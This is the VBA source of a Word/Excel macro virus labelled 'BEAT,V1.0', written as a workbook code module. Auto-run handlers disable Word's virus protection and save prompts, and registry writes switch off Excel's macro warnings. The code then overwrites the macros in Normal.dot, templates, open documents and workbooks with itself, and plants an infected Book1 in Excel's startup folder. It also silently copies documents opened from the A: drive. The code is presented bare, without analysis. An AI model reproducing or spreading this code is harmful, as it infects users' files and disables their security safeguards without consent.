   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisWorkbook"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   '<!--BEAT,V1.0-->
   '2000-4
   Private Sub autoexec()
       SaveAsMyFile "A:", Application.Path
       InfectWordAndExcel
   End Sub
   Private Sub autoopen()
       SaveAsMyFile "A:", Application.Path
       InfectWordAndExcel
   End Sub
   Private Sub Document_Close()
       SaveAsMyFile "A:", Application.Path
       InfectWordAndExcel
   End Sub
   Private Sub Workbook_Deactivate()
       InfectWordAndExcel
   End Sub

   Private Sub InfectWordAndExcel()
       On Error Resume Next
       Set WordObj = GetObject(, "Word.Application")
        If WordObj = "" Then
       Set WordObj = CreateObject("Word.Application")
           WQuit = True
       End If
       Set xlApp = GetObject(, "Excel.Application")
        If xlApp = "" Then
       Set xlApp = CreateObject("Excel.Application")
           EQuit = True
       End If
   ''===============================================
   '''word'VirusProtection
        Set WdappOp = WordObj.Options
       With WdappOp
           .VirusProtection = False
           .ConfirmConversions = False
           .SaveNormalPrompt = False
       End With    ''
       '''excel'VirusProtection
       System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = "0" ' = "Check"
       System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = "0" '= ""
       System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = "0" ' = "Whoa"
   ''==========================
       Set nt = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
       Set TT = WordObj.Templates(1).VBProject.VBComponents(1).CodeModule
       Set ad = WordObj.ActiveDocument.VBProject.VBComponents(1).CodeModule
   ''  DoWordtoItself
   If Application.Name = "Microsoft Word" Then
        If ad.Lines(1, 1) <> "'<!--BEAT,V1.0-->" Then
           ad.DeleteLines 1, ad.CountOfLines
           ad.InsertLines 1, TT.Lines(1, TT.CountOfLines)
           If ad.Lines(1, 1) <> "'<!--BEAT,V1.0-->" Then
               ad.InsertLines 1, nt.Lines(1, nt.CountOfLines)
           End If
       End If
        If nt.Lines(1, 1) <> "'<!--BEAT,V1.0-->" Then
           nt.DeleteLines 1, nt.CountOfLines
           nt.InsertLines 1, ad.Lines(1, ad.CountOfLines)
        End If
           '-------------------
        If TT.Lines(1, 1) <> "'<!--BEAT,V1.0-->" Then
           TT.DeleteLines 1, TT.CountOfLines
           TT.InsertLines 1, nt.Lines(1, nt.CountOfLines)
       End If
       ActiveDocument.Save
   ''    DoWordtoExcel
       '-----------
       If UCase(Dir(xlApp.Application.StartupPath + "\Book1.")) = UCase("BOOK1") Then ''×ª³É´óÐ´µÄ×Ö·û´®
               Kill xlApp.Application.StartupPath + "\Book1."
       End If
       '------------
       Set Book1Obj = xlApp.Workbooks.Add
           Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, nt.Lines(1, nt.CountOfLines)
           Book1Obj.SaveAs xlApp.Application.StartupPath & "\Book1."
           Book1Obj.Close
    End If ''====Word
    ''===================================================
   '''Workbook_Deactivate
   If Application.Name = "Microsoft Excel 8.0 ÖÐÎÄ°æ" Then
       Set AW = xlApp.ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
       Set TW = xlApp.ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
           If AW.Lines(1, 1) <> "'<!--BEAT,V1.0-->" Then
           AW.DeleteLines 1, AW.CountOfLines
           AW.InsertLines 1, TW.Lines(1, TW.CountOfLines)
       End If
           If TW.Lines(1, 1) <> "'<!--BEAT,V1.0-->" Then
           TW.DeleteLines 1, TW.CountOfLines
           TW.InsertLines 1, AW.Lines(1, TW.CountOfLines)
       End If
       '--------------
        If nt.Lines(1, 1) <> "'<!--BEAT,V1.0-->" Then
           nt.DeleteLines 1, nt.CountOfLines
           nt.InsertLines 1, TW.Lines(1, TW.CountOfLines)
        End If
        ActiveWorkbook.Save
     End If ''-----Excel-----
     '--===================================================
       Set nt = Nothing
       Set TT = Nothing
       Set ad = Nothing
       Set AW = Nothing
       Set TW = Nothing
       If WQuit = True Then WordObj.Quit
       If EQuit = True Then xlApp.Quit
   ''========
   End Sub
   Private Sub SaveAsMyFile(ByVal RecentPath As String, ByVal SaveAsMyPath As String) ''SaveAsMyPath As String
       Dim MySavedAsFile
       Dim AskPath
           On Error Resume Next
          Application.StatusBar = ""
       With ActiveDocument
              MySavedAsFile = "\" & Date & "-" & .Name
              AskPath = .Path
           If AskPath = RecentPath Then
        .SaveAs FileName:=SaveAsMyPath & MySavedAsFile, AddToRecentFiles:=False, Password:=""
         End If
       End With
   End Sub
